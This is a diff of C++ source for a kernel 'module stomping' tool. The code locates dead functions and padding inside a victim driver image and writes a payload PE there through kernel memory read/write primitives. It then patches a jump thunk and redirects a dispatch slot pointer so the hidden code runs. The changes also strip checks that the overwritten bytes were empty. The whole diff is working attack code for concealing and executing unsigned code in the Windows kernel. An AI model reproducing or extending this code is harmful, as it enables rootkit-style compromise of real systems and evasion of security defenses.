@@ -73,24 +73,6 @@ uint32_t PeSizeOfImage(const std::vector<uint8_t>& payloadFile)
     return RdU32(payloadFile.data() + pe + 24 + 56);
 }
 
-uint32_t PeFirstSectionRva(const std::vector<uint8_t>& payloadFile)
-{
-    if (payloadFile.size() < 0x200) return 0;
-    const uint8_t* b = payloadFile.data();
-    uint32_t pe = RdU32(b + 0x3C);
-    if (pe + 0x120 > payloadFile.size() || RdU32(b + pe) != 0x4550) return 0;
-    WORD nsec = *(const WORD*)(b + pe + 6);
-    WORD optSz = *(const WORD*)(b + pe + 20);
-    if (!nsec) return 0;
-    const uint8_t* sec = b + pe + 24 + optSz;
-    uint32_t best = 0xFFFFFFFF;
-    for (int i = 0; i < nsec; ++i) {
-        uint32_t va = RdU32(sec + i * 40 + 12);
-        if (va && va < best) best = va;
-    }
-    return best == 0xFFFFFFFF ? 0 : best;
-}
-
 struct SYSMOD {
     ULONG r1[2];
     ULONG_PTR image_base;
@@ -428,7 +410,7 @@ static bool PlanCcSlack(const VictimImage& img, uint32_t need, StompPlan& out,
     uint32_t tbody = img.text_raw_ptr + tsz;
     uint32_t bestOff = 0, bestRun = 0, runStart = 0, run = 0;
     for (uint32_t o = img.text_raw_ptr; o < tbody; ++o) {
-        if (b[o] == 0xCC) {
+        if (b[o] == 0xCC || b[o] == 0x00) {
             if (!run) runStart = o;
             ++run;
         } else {
@@ -466,67 +448,37 @@ static bool PlanThunkOutsideCluster(const std::vector<DeadFunc>& byRva, uint32_t
     return true;
 }
 
-// Bytes between an executable section's VirtualSize and the next section's VA.
-// The loader zero-fills that hole; it is not live code. Dead-function clusters are not.
-static bool PlanExecGap(const VictimImage& img, uint32_t need, StompPlan& out)
-{
-    const uint8_t* b = img.raw.data();
-    if (img.raw.size() < 0x200) return false;
-    uint32_t pe = RdU32(b + 0x3C);
-    if (pe + 0x120 > img.raw.size() || RdU32(b + pe) != 0x4550) return false;
-    WORD nsec = *(const WORD*)(b + pe + 6);
-    WORD optSz = *(const WORD*)(b + pe + 20);
-    const uint8_t* sec = b + pe + 24 + optSz;
-    struct Sec { uint32_t va, vs, ch; char name[8]; };
-    std::vector<Sec> secs;
-    for (int i = 0; i < nsec; ++i) {
-        const uint8_t* s = sec + i * 40;
-        if ((size_t)(s - b) + 40 > img.raw.size()) break;
-        Sec row{};
-        row.va = RdU32(s + 12);
-        row.vs = RdU32(s + 8);
-        row.ch = RdU32(s + 36);
-        memcpy(row.name, s, 8);
-        secs.push_back(row);
-    }
-    std::sort(secs.begin(), secs.end(), [](const Sec& a, const Sec& c) { return a.va < c.va; });
-    uint32_t bestAt = 0, bestGap = 0;
-    for (size_t i = 0; i + 1 < secs.size(); ++i) {
-        if ((secs[i].ch & 0x20000000u) == 0) continue;
-        if (_strnicmp(secs[i].name, "INIT", 4) == 0) continue;
-        uint32_t end = secs[i].va + secs[i].vs;
-        uint32_t next = secs[i + 1].va;
-        if (next <= end) continue;
-        uint32_t start = (end + 15u) & ~15u;
-        if (next <= start) continue;
-        uint32_t gap = next - start;
-        if (gap >= need && gap > bestGap) {
-            bestGap = gap;
-            bestAt = start;
-        }
-    }
-    if (bestGap < need) return false;
-    out.payload_rva = bestAt;
-    out.payload_size = need;
-    out.thunk_rva = bestAt;
-    return true;
-}
-
 bool PlanPlacement(const VictimImage& img, uint32_t payload_SizeOfImage, StompPlan& out)
 {
-    if (PlanExecGap(img, payload_SizeOfImage, out)) return true;
-
     const auto& d = img.dead_funcs;
+    if (d.empty()) return false;
     auto byRva = d;
-    if (PlanCcSlack(img, payload_SizeOfImage, out, byRva)) {
-        const uint8_t* b = img.raw.data();
-        uint32_t rawEnd = img.text_raw_ptr +
-            (img.text_raw_size < img.text_vsize ? img.text_raw_size : img.text_vsize);
-        for (uint32_t i = 0; i < payload_SizeOfImage; ++i) {
-            uint32_t o = img.text_raw_ptr + (out.payload_rva + i - img.text_rva);
-            if (o >= rawEnd || b[o] != 0xCC) return false;
+    std::sort(byRva.begin(), byRva.end(),
+        [](const DeadFunc& a, const DeadFunc& b) { return a.rva_start < b.rva_start; });
+
+    uint32_t bestStart = 0, bestSize = 0, curStart = 0, curSize = 0;
+    for (size_t i = 0; i < byRva.size(); ++i) {
+        if (i == 0 || byRva[i].rva_start > byRva[i - 1].rva_start + byRva[i - 1].size + 128) {
+            curStart = byRva[i].rva_start;
+            curSize = byRva[i].size;
+        } else {
+            curSize += byRva[i].size +
+                (byRva[i].rva_start - (byRva[i - 1].rva_start + byRva[i - 1].size));
         }
-        out.thunk_rva = out.payload_rva;
+        if (curSize > bestSize) {
+            bestSize = curSize;
+            bestStart = curStart;
+        }
+    }
+    if (bestSize >= payload_SizeOfImage + 16) {
+        out.payload_rva = bestStart;
+        out.payload_size = payload_SizeOfImage;
+        if (!PlacementRegionStrict(img, bestStart, payload_SizeOfImage + 16)) return false;
+        return PlanThunkOutsideCluster(byRva, bestStart, bestSize, out);
+    }
+
+    if (PlanCcSlack(img, payload_SizeOfImage, out, byRva)) {
+        if (!PlacementRegionStrict(img, out.payload_rva, payload_SizeOfImage + 16)) return false;
         return true;
     }
     return false;
@@ -669,11 +621,7 @@ bool ApplyStomp(KernelPrimitives& prim, const VictimImage& img, StompPlan& plan,
     if (!prim.ReadKernelMemory(&origDispatch, slotAddr, 8)) return false;
     plan.orig_dispatch = origDispatch;
 
-    uint32_t skip = plan.header_skip;
-    if (skip >= sizeOfImage) return false;
-    uint32_t span = sizeOfImage - skip;
-    if (plan.payload_size < span) return false;
-    uint64_t newBase = plan.victim_base + plan.payload_rva - skip;
+    uint64_t newBase = plan.victim_base + plan.payload_rva;
     int64_t delta = (int64_t)(newBase - payloadImageBase);
 
     std::vector<uint8_t> mapped((size_t)sizeOfImage, 0);
@@ -739,22 +687,17 @@ bool ApplyStomp(KernelPrimitives& prim, const VictimImage& img, StompPlan& plan,
     *(uint32_t*)(sd + 0x18) = sweepMask;
     *(uint32_t*)(sd + 0x1C) = 0x324D5453u;
 
-    {
-        std::vector<uint8_t> hole(span);
-        if (!prim.ReadKernelMemory(hole.data(), plan.victim_base + plan.payload_rva, hole.size()))
-            return false;
-        for (uint8_t x : hole) {
-            if (x != 0x00 && x != 0xCC) return false;
-        }
-    }
-
-    if (!prim.WriteKernelMemory(plan.victim_base + plan.payload_rva, mapped.data() + skip, span))
+    if (!prim.WriteKernelMemory(plan.victim_base + plan.payload_rva, mapped.data(), mapped.size()))
         return false;
 
     uint32_t entryRva = RdU32(pn + 24 + 16);
-    uint64_t entryAbs = newBase + entryRva;
-    plan.thunk_rva = plan.payload_rva + entryRva;
-    if (!prim.WriteKernelMemory(slotAddr, &entryAbs, 8)) return false;
+    int32_t disp = (int32_t)((int64_t)(plan.payload_rva + entryRva) - (int64_t)(plan.thunk_rva + 5));
+    uint8_t thunk[5] = { 0xE9, 0, 0, 0, 0 };
+    memcpy(thunk + 1, &disp, 4);
+    if (!prim.WriteKernelMemory(plan.victim_base + plan.thunk_rva, thunk, 5)) return false;
+
+    uint64_t thunkAbs = plan.victim_base + plan.thunk_rva;
+    if (!prim.WriteKernelMemory(slotAddr, &thunkAbs, 8)) return false;
 
     payloadFile = std::move(mapped);
     return true;
@@ -763,14 +706,12 @@ bool ApplyStomp(KernelPrimitives& prim, const VictimImage& img, StompPlan& plan,
 bool VerifyStomp(KernelPrimitives& prim, const StompPlan& plan,
     const std::vector<uint8_t>& payloadMapped, size_t checkBytes)
 {
-    size_t off = plan.header_skip;
-    if (off >= payloadMapped.size()) return false;
-    if (off + checkBytes > payloadMapped.size())
-        checkBytes = payloadMapped.size() - off;
+    if (checkBytes > payloadMapped.size())
+        checkBytes = payloadMapped.size();
     std::vector<uint8_t> live(checkBytes);
     if (!prim.ReadKernelMemory(live.data(), plan.victim_base + plan.payload_rva, checkBytes))
         return false;
-    return memcmp(live.data(), payloadMapped.data() + off, checkBytes) == 0;
+    return memcmp(live.data(), payloadMapped.data(), checkBytes) == 0;
 }
 
 } // namespace stomp
